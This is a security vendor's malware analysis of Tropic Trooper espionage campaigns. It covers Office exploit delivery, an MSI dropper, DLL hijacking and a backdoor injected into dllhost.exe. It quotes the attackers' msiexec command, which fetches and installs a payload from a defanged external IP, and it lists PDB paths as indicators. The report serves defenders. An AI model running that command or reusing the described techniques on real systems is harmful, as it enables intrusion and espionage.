Tropic Trooper’s New Strategy
Posted on: March 14, 2018 at 7:01 am Posted in: Exploits, Malware, Targeted Attacks
Author:
Trend Micro

by Jaromir Horejsi, Joey Chen, and Joseph C. Chen

Tropic Trooper (also known as KeyBoy) levels its campaigns against Taiwanese, Philippine, and
Hong Kong targets, focusing on their government, healthcare, transportation, and high-tech
industries. Its operators are believed to be very organized and develop their own cyberespionage
tools that they fine-tuned in their recent campaigns. Many of the tools they use now feature new
behaviors, including a change in the way they maintain a foothold in the targeted network.

Attack Chain

 
Figure 1. Attack chain of Tropic Trooper’s operations

Here’s a summary of the attack chain of Tropic Trooper’s recent campaigns:

1. Execute a command through exploits for CVE-2017-11882 or CVE-2018-0802, security flaws in
Microsoft Office’s Equation Editor (EQNEDT32.EXE).

2. Download an installer package (.msi) and install it on the system by executing the command: /c
msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]).

3. This system configuration file (in.sys) will drop a backdoor installer (UserInstall.exe) then delete
itself. The backdoor installer will drop a normal sidebar.exe file (a Windows Gadget tool, a feature
already discontinued by Windows), a malicious loader (in
“C:\ProgramData\Apple\Update\wab32res.dll“), and an encrypted configuration file.
UserInstall.exe will abuse the BITSadmin command-line tool to create a job and launch
sidebar.exe.

4. The malicious loader will use dynamic-link library (DLL) hijacking — injecting malicious code
into a process of a file/application — on sidebar.exe and launch dllhost.exe (a normal file). The
loader will then inject a DLL backdoor into dllhost.exe.
We also observed malicious documents that don’t need to download anything from the internet as
the backdoor’s dropper is already embedded in the document. This, however, doesn’t influence the
overall result for the victim.

The backdoor will load the encrypted configuration file and decrypt it, then use Secure Sockets
Layer (SSL) protocol to connect to command-and-control (C&C) servers.

Tropic Trooper uses exploit-laden Microsoft Office documents to deliver malware to targets. These
documents use job vacancies in organizations that may be deemed socio-politically sensitive to
recipients. Below is a screenshot of the document used in their latest campaigns:

 
Figure 2. Malicious document used by Tropic Trooper

PDB Strings as Context Clues 
The MSI file has two program database (PDB) strings inside: one belonging to the MSI file, and
another for the backdoor installer (detected by Trend Micro as TROJ_TCDROP.ZTFB).

 
Figure 3. PDB strings inside the MSI file

The first PDB string has a certain ss2/Projects/MsiWrapper (Project MsiWrapper) in it, which we
found to be an open-source application that converts executable setup programs to MSI files. The
second PDB string contains Work, House, and TSSL: we can assume this tool belongs to Tropic
Trooper’s TSSL project as seen by other researchers. Here it is a new one, as seen in their
misspelling of “Horse” to “House” (other reports had the string typed correctly).

Another interesting PDB string we found is
D:\Work\Project\VS\house\Apple\Apple_20180115\Release\InstallClient.pdb. At installation, the
MSI file drops three files and creates one hidden directory (UFile) into
C:\ProgramData\Apple\Update\, likely as a ruse.

It would then use sidebar.exe to load the malicious wab32res.dll (TROJ_TCLT.ZDFB) through
DLL hijacking. This is carried out to evade antivirus (AV) detection, because wab32res.dll is
loaded by a benign file.

 
Figure 4. The installer drops three files into the Apple/Update directory 

 
Figure 5. PDB strings inside the loader file

From the PDB string above, the attackers intended it to be a loader (hence the name FakeRun) and
not the actual backdoor. FakeRun’s PDB string
(D:\Work\Project\VS\house\Apple\Apple_20180115\Release\FakeRun.pdb) indicates the loader will
execute dllhost.exe and inject one malicious DLL file, which is the backdoor, into this process. The
backdoor, TClient (BKDR_TCLT.ZDFB), is so named from its own PDB string.

Figure 6. TClient is injected into dllhost.exe

Malware Analysis  
wab32res.dll (FakeRun loader) loads TClient. Once the loader is executed, it will check the current
process (sidebar.exe) whether to load it or not. Successfully checking the loader will execute the
dllhost.exe process and create a hardcode mutex to avoid injecting it into the wrong dllhost.exe, as
there can be multiple instances of it depending on the number of programs using the Internet
Information Services.

 
Figure 7. The loader checking the sidebar process 

 
Figure 8. The malicious loader injecting the backdoor into dllhost.exe 

 
Figure 9. Comparison of TClient’s configuration format in 2016 (left, from other researchers) and

2018 (right)

TClient will use SSL to connect to Tropic Trooper’s C&C server. However, the C&C server and
some configuration values are not hardcoded in the backdoor. This allows Tropic Trooper’s
operators to easily change/update the C&C server and configure other values.

TClient is actually one of Tropic Trooper’s other backdoors. The backdoor noted by other security
researchers was encoded with different algorithms and configured with different parameter names
in 2016, for instance. TClient uses symmetric encryption to decrypt its configuration with one 16-
byte key in 2018. The image and table below illustrate TClient’s encrypted configuration that we
decrypted (via Python code):

Figure 12. Decrypted backdoor configuration

Reverse analysis of TClient allowed us to determine how to decrypt the C&C information. TClient
will use custom SSL libraries to connect the C&C server. We also found another SSL certificate on
this C&C server. A closer look reveals that it was registered quite recently, and is set to expire after
a year, suggesting Tropic Trooper’s use or abuse of components or services that elapse so they can
leave as few traces as possible.

 
Figure 13. SSL certificate’s validity

Following Tropic Trooper’s Trails  
We further monitored their activities and found three additional and notable PDB strings in their
malware:

D:\Work\Project\VS\HSSL\HSSL_Unicode _2\Release\ServiceClient.pdb
D:\Work\VS\Horse\TSSL\TSSL_v3.0\TClient\Release\TClient.pdb
D:\Work\VS\Horse\TSSL\TSSL_v0.3.1_20170722\TClient\x64\Release\TClient.pdb
These came from open-intelligence platforms and incident response cases. These strings shed
further light on Tropic Trooper’s operations:

They have another campaign/project named HSSL, which supports Unicode characters.
The TSSL project has a v3.0 version, indicating the operators can mix and match different versions
of their malware, depending on their target.
The TSSL project has 64-bit version.
The Need for a Proactive Incident Response Strategy 
Cyberespionage campaigns are persistent and, as shown by Tropic Trooper, always raring to exploit
weaknesses in people and technology. For organizations, this highlights the significance of staying
ahead of their attackers: detect, analyze, and respond. What techniques will they use? How can my
organization’s attack surface be reduced? What did I do to respond to the threat — what worked,
what didn’t, and what could be fine-tuned?

A proactive incident response strategy provides threat intelligence — from the endpoint to the
network — that can let IT/system administrators identify malicious activities that aren’t typically
visible to traditional security solutions.

TClient, for instance, uses DLL hijacking and injection that may not be as noticeable to others. Its
use of the SSL protocol also means it can blend with legitimate traffic. Analyzing their PDB strings
can also provide a deeper insight into the campaign’s bigger picture. Ascertaining the tactics and
techniques they use empower organizations in developing robust and actionable indicators of
compromise (IoCs) that can act as benchmarks for response.

Here are some best practices that organizations can adopt:

Keep the system, its applications, and the network updated. The vulnerabilities that Tropic
Trooper’s campaigns have been patched last January, for instance. Enforce a stronger patch
management policy, and consider virtual patching for legacy systems.
Enforce the principle of least privilege: Employ network segmentation and data categorization to
deter lateral movement and mitigate further exposure. Application control and behavior monitoring
block suspicious files and anomalous routines from being installed or executed in the system.
Disable or secure the use of system administration tools such as PowerShell and other command-
line tools that may be abused.
Actively monitor your perimeter, from gateways and endpoints to networks and servers. Firewalls
as well as intrusion detection and prevention systems help thwart network-based attacks.
Nurture a culture of cybersecurity. Spear-phishing emails, for instance, rely on baiting targets with
socially engineered documents. The technologies that help protect the organization are only as good
as the people who use them.
